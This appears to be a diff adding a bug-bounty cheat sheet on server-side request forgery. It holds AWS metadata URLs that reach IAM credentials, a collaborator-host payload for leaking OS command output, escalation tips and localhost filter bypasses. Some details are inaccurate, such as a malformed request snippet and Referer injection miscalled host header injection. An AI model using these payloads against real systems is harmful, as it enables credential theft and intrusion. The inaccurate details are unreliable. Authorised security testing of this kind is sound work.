@@ -1,0 +1,75 @@
+##BugBountyTips ##ServerSideRequestForgery
+
+Author : @NovanAR
+GitHub : https://github.com/novanazizr
+  
+  
+##Full Description About SSRF
+  
+  https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF
+  
+##How To Find SSRF?
+ 
+1. If you got Open Redirect try escalating it to SSRF.
+2. gf SSRF to grep parameters may vulnerable to SSRF.
+3. SSRF's are more in API's so crawl the whole web app with burp proxy turned on and search for keywords like., eg :
+
+		?url=
+		?uri=
+		?req= 
+        
+4. Sign up with an Email like attacker.collaborator.net. If u receive HTTP req. in collaborator then its SSRF. But if there's no impact don't report it, DNS and SMTP request doesn't matters.
+
+  
+##AWS Metadata
+
+1. AWS localhost is 169.254.169.254 so don't use 127.0.0.1 there!
+2. If you found an SSRF vulnerability that runs on EC2, try requesting :
+
+   	http://169.254.169.254/latest/meta-data/
+	http://169.254.169.254/latest/user-data/
+	http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE
+	http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
+      
+      Source : https://twitter.com/ADITYASHENDE17/status/1305051512335298562
+ 
+##Escalation
+  
+1. Try to escalate it to RCE using AWS Metadata
+   
+        Source : https://hackerone.com/reports/341876
+
+2. Try to escalate it to OS Command Injection using collaborator
+          
+          <os cmd>.collaborator.net
+        
+        Source : https://www.youtube.com/watch?v=apzJiaQ6a3k
+          
+3. Try to escalate it to XSS using SVG image
+          
+        Source : https://hackerone.com/reports/223203
+
+
+##Blind SSRF Tips
+
+1. Try to find Blind SSRF on hidden parameter
+2. Try Blind SSRF on referer header
+          
+One way of finding them is by inserting your burp collaborator domain into the referrer header also known as host header injection.
+
+Snippet:
+
+    GET /HTTP 1.1
+    Host: site.com
+    User Agent: Firefox
+    Referrer: https://your_collaborator_instance.com
+
+##SSRF Bypass
+      
+1. http://[0:0:0:0:0:ffff:127.0.0.1]/(the file)
+        
+  		Source : https://hackerone.com/reports/736867
+
+2. Using %E3%80%82 (。) Url Encode
+          
+        Source : https://twitter.com/h4x0r_dz/status/1335880542353559552
